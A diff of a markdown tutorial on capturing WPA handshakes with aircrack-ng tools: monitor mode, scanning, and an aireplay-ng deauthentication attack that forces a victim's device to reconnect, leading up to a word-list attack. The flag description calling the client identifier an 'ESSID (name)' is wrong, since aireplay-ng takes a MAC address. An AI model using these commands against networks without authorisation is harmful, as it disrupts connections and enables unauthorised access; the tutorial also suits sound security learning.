@@ -35,16 +35,15 @@ Use the airmon-ng tool to switch your network card to monitor mode.
 airmon-ng start <wireless interface>
 ```
 
-Example: `airmon-ng start wlp3s0`
-
 ### 3 - Verify Monitor Mode
-The wireless interface should be displayed as `<interface>mon` (e.g., wlp3s0mon).
+Now, the wireless interface should be displayed as `<interface>mon` (e.g., wlp3s0mon).
 <br>If not, it means your network card doesn't support monitor mode, and you'll need the external network card mentioned earlier.
 <br>Run the command in a terminal to check if the network card's mode has changed to monitor.
 
 ```
 iwconfig
 ```
+It should appear `Mode: Monitor`.
 
 ### 4 - Scan for Networks
 Use airodump-ng to view the networks around you.
@@ -55,18 +54,16 @@ Use airodump-ng to view the networks around you.
 airodump-ng <wireless interface>mon
 ```
 
-Example: `airodump-ng wlp3s0mon`
-
-
 ### 5 - Target Network
 Identify the BSSID and channel of the network you wish to attack.
 
 ### 6 - Capture the Handshake
-This command will start capturing the handshake from devices connected to the target network.
+This command will show all the devices currently connected to that network.
+<br>If you watch a video in one of this devices, the amount of packets (frames) being set to a device increses a lot. 
 <br>In a new terminal window, enter the command:
 
 ```
-airodump-ng --bssid <BSSID> --channel <channel> --write <filename> <wireless interface>mon
+airodump-ng -d(--bssid) <BSSID> -w(--write) <filename> -c(--channel) <channel>  <wireless interface>mon
 ```
 - `<BSSID>` - target network's BSSID;
 - `<channel>` - target network's channel;
@@ -74,20 +71,22 @@ airodump-ng --bssid <BSSID> --channel <channel> --write <filename> <wireless int
 - `<wireless interface>mon` - name of your wireless interface in monitor mode;
 
 ### 7 - Deauthentication Attack
-Now we need to to send deauthentication packets to the victim's device, forcing it to disconnect and reconnect to the network.
-<br>Use the command:
+Now we need to to send deauthentication packets to the victim's device, forcing it to disconnect and reconnect to the network so we can capture the handshake.
+<br>Leave the previous terminal open and running.
+<br>Use this command in another terminal:
 
 ```
 aireplay-ng -0 10 -a <BSSID> -c <client ESSID> <wireless interface>mon
 ```
-
-- `<BSSID>` - target network's BSSID;
-- `<client ESSID>` - ESSID (name) of the device you want to deauthenticate (e.g., the victim's device);
+- `-0 10` - deauthentication and we gonna send 10 packets;
+- `-a <BSSID>` - target network's BSSID;
+- `-c <client ESSID>` - ESSID (name) of the device you want to deauthenticate (e.g., the victim's device);
 - `<wireless interface>mon` - name of your wireless interface in monitor mode;
 
 ### 8 - Capture the Handshake
 Observe the terminal running `airodump-ng` (step 6) and wait for a device to reconnect.
-<br>Once the handshake is captured, you can stop `airodump-ng` by pressing `Ctrl+C`.
+<br>Once the handshake is captured, you can see a message saying `WPA handshake: <BSSID>`.
+<br>You can stop `airodump-ng` by pressing `Ctrl+C`.
 <br>The captured handshake will be saved in the specified filename.
 
 ### 9 - Word List Attack
